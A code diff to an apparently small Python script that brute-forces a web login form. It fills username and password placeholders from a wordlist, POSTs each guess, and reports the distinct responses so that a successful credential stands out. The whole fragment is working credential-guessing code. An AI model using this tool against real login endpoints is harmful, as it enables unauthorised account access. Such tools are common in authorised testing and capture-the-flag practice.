@@ -76,21 +76,40 @@ def user_pass_replace(placeholder_data, row):
         user = row[0]
         passw = row[1]
         return get_replaced_data(placeholder_data, {"__USER__": user, "__PASS__": passw})
-    else: 
+    else:
         return placeholder_data
 
 
+def print_results(distinct_data_responses):
+    if len(distinct_data_responses) <= 1:
+        sys.exit("Bruteforce failed")
+
+    print(f"{len(distinct_data_responses)} distinct responses. Check results for success response.")
+    print(distinct_data_responses)
+
+
+def send(url, req_data):
+    try:
+        print(f"Sending: '{req_data}'")
+        res = requests.post(url, data=req_data, timeout=5)
+        return res.content
+    except requests.RequestException:
+        print(
+            f"Error while trying to send POST request to '{url}' with data '{req_data}'")
+        return ""
+
+
 def send_requests(url, list_file, placeholder_data, replace_func):
+    distinct_data_responses = []
     with open(list_file, "r") as lf:
         while row := lf.readline().strip():
             req_data = replace_func(placeholder_data, row)
-            try:
-                print(f"Sending: '{req_data}'")
-                res = requests.post(url, data=req_data, timeout=5)
-                print(res.content)
-            except requests.RequestException:
-                print(
-                    f"Error while trying to send POST request to '{url}' with data '{req_data}'")
+            res = send(url, req_data)
+            responses = [
+                res for data_res_dict in distinct_data_responses for data, res in data_res_dict.items()]
+            if res not in responses:
+                distinct_data_responses.append({req_data: res})
+    print_results(distinct_data_responses)
 
 
 def main():
@@ -109,4 +128,3 @@ if __name__ == "__main__":
         main()
     except KeyboardInterrupt:
         sys.exit("Interrupted by user")
-        
